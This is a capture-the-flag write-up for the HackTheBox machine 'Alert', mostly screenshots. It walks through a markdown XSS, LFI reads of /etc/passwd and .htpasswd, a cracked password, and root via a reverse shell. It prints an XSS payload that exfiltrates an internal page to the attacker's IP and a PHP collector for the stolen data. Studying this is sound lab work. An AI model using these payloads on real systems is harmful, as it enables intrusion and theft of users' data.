---
tags:
  - xss
  - apache
  - htpasswd
created: 2025-04-05
image: static/note-thumbnails/htb-help.png
description: Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain `SSH` access to the target. Enumeration of processes running on the system shows a `PHP` file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root.
---

![](static/note-thumbnails/htb-help.png)
### Initial enumeration

>[!code]- Open ports (22, 80, 12227)
>![Pasted image 20250405134353](Images/Pasted%20image%2020250405134353.png)

>[!code]- Discover `alert.htb`
>###### Curl
>![Pasted image 20250405134651](Images/Pasted%20image%2020250405134651.png)
>###### Add `alert.htb` to `/etc/hosts`
>![Pasted image 20250405134744](Images/Pasted%20image%2020250405134744.png)
>###### Visit `http://alert.htb`
>![Pasted image 20250405134817](Images/Pasted%20image%2020250405134817.png)
### XSS vulnerability

>[!code]- Find a XSS vulnerability
>###### Landing page lets us upload a markdown file
>![Pasted image 20250405140532](Images/Pasted%20image%2020250405140532.png)
>###### We can 'view' the uploaded markdown file
>![Pasted image 20250405140610](Images/Pasted%20image%2020250405140610.png)
>###### The markdown appears to have been injected into the HTML
>![Pasted image 20250405140642](Images/Pasted%20image%2020250405140642.png)
>###### Create a malicious md file which creates an alert
>![Pasted image 20250405140851](Images/Pasted%20image%2020250405140851.png)
>###### Upload the file to find it causes an alert popup
>![Pasted image 20250405140837](Images/Pasted%20image%2020250405140837.png)

>[!code]- The XSS-infected page can be shared
>###### The page includes a share button with a link to our vulnerable page
>Source code:
>
>![Pasted image 20250405141041](Images/Pasted%20image%2020250405141041.png)
>
>Rendered HTML (bottom right):
>
>![Pasted image 20250405141116](Images/Pasted%20image%2020250405141116.png)

>[!code]- The site admin clicks all links sent in a message
>###### Admin reviews contact messages
>![Pasted image 20250405141232](Images/Pasted%20image%2020250405141232.png)
>###### Said contact page
>![Pasted image 20250405141256](Images/Pasted%20image%2020250405141256.png)

>[!code]- Find a password protected subdomain `statistics.alert.htb`
>###### Subdomain fuzz with ffuf
>![Pasted image 20250407053449](Images/Pasted%20image%2020250407053449.png)
>###### Credentials are required to access it
>![Pasted image 20250407053837](Images/Pasted%20image%2020250407053837.png)

>[!code]- Use the XSS to find a LFI at `/messages.php?file=`
>###### Find the `/messages.php` page
>![Pasted image 20250407054215](Images/Pasted%20image%2020250407054215.png)
>###### Request for `/messages.php` returns empty
>![Pasted image 20250407054305](Images/Pasted%20image%2020250407054305.png)
>###### Use XSS to have admin request and return `/messages.php` to attacking machine
>![Pasted image 20250407054409](Images/Pasted%20image%2020250407054409.png)
>```javascript
><script>fetch('http://alert.htb/messages.php').then(r=>r.text()).then(h=>fetch('http://10.10.14.12',{method:'POST',body:h})).catch(e=>console.error(e))</script>
>```
>###### Then setup a php server with an `index.php` which records the received data
>![Pasted image 20250407054608](Images/Pasted%20image%2020250407054608.png)
>```php
><?php file_put_contents('received_data.html', file_get_contents('php://input') . "\n", FILE_APPEND); ?>
>```
>###### Send the share link of the uploaded `malicious.md` file within the contact form and wait for the POST request to be received on a php server setup on the attacking machine
>![Pasted image 20250407054916](Images/Pasted%20image%2020250407054916.png)
>###### Read the received POST request to find the `?file=` parameter
>![Pasted image 20250407054950](Images/Pasted%20image%2020250407054950.png)
>

>[!code]- Find a LFI vulnerability in the `?file=` parameter
>###### Send a request which tries to read `/etc/passwd`
>![Pasted image 20250407055113](Images/Pasted%20image%2020250407055113.png)
>###### It worked
>![Pasted image 20250407055156](Images/Pasted%20image%2020250407055156.png)

>[!code]- Use the LFI vulnerability to obtain the the login hash for `albert` for `statistics.alert.htb`
>###### Use the LFI to read `/etc/apache2/sites-available/000-default.conf` file
>(This file is used to record the document root. It reveals the document root for the virtual host `statistics`). It also shows the existence of the file `statistics.alert.htb/.htpasswd`
>
>![Pasted image 20250407060359](Images/Pasted%20image%2020250407060359.png)
>
>Received data
>
>![Pasted image 20250407060250](Images/Pasted%20image%2020250407060250.png)
>###### Use the LFI to read `statistics.alert.htb/.htpasswd`
>![Pasted image 20250407060614](Images/Pasted%20image%2020250407060614.png)
>![Pasted image 20250407060559](Images/Pasted%20image%2020250407060559.png)

>[!code]- Crack the hash (`albert:manchesterunited`)
>###### Use Hashcat (disabling cached results (--potfile-disable))
>![Pasted image 20250407060842](Images/Pasted%20image%2020250407060842.png)

>[!code]- SSH as `albert` using the `manchesterunited` password
>###### SSH
>![Pasted image 20250407061057](Images/Pasted%20image%2020250407061057.png)

>[!success]- Obtain user
>![Pasted image 20250407061150](Images/Pasted%20image%2020250407061150.png)
### Privilege escalation

>[!code]- Root is running a cron job to execute `/opt/website-monitor/monitor.php`
>###### psp64 output
>![Pasted image 20250407062314](Images/Pasted%20image%2020250407062314.png)

>[!code]- Albert is part of the `management` group & the management group can edit `/opt/website-monitor/config/configuration.php`
>###### linpeas output
>![Pasted image 20250407061827](Images/Pasted%20image%2020250407061827.png)

>[!code]- The `configuration.php` appears to set the document root for the `website-monitor` programme
>###### Contents of `configuration.php`
>![Pasted image 20250407062615](Images/Pasted%20image%2020250407062615.png)

>[!code]- `website-monitor` is running on internal port 8080
>###### ps aux
>![Pasted image 20250408064507](Images/Pasted%20image%2020250408064507.png)
>###### netstat -antp
>![Pasted image 20250408064535](Images/Pasted%20image%2020250408064535.png)

>[!fail]- I can't alter alter `configuration.php` as it triggers `php_bot.sh` which reverts changes
>###### Pspy64 shows `php_bot.sh` runs every X seconds when `configuration.php` is altered
>![Pasted image 20250408064241](Images/Pasted%20image%2020250408064241.png)
>

>[!code]- Add a malicious php script to `/config` and execute to obtain a reverse shell
>###### Setup a port forward to access web server on attacking machine
>![Pasted image 20250408064607](Images/Pasted%20image%2020250408064607.png)
>###### Check access on attacking machine
>![Pasted image 20250408064640](Images/Pasted%20image%2020250408064640.png)
>###### Add a malicious php script (pentest monkey) to `/config`
>![Pasted image 20250408064727](Images/Pasted%20image%2020250408064727.png)
>###### Access `/config/shell.php` via port forward to trigger reverse shell
>![Pasted image 20250408064758](Images/Pasted%20image%2020250408064758.png)
>###### Catch the reverse shell as root
>![Pasted image 20250408064826](Images/Pasted%20image%2020250408064826.png)

>[!success]- Obtain root.txt
>![Pasted image 20250408064850](Images/Pasted%20image%2020250408064850.png)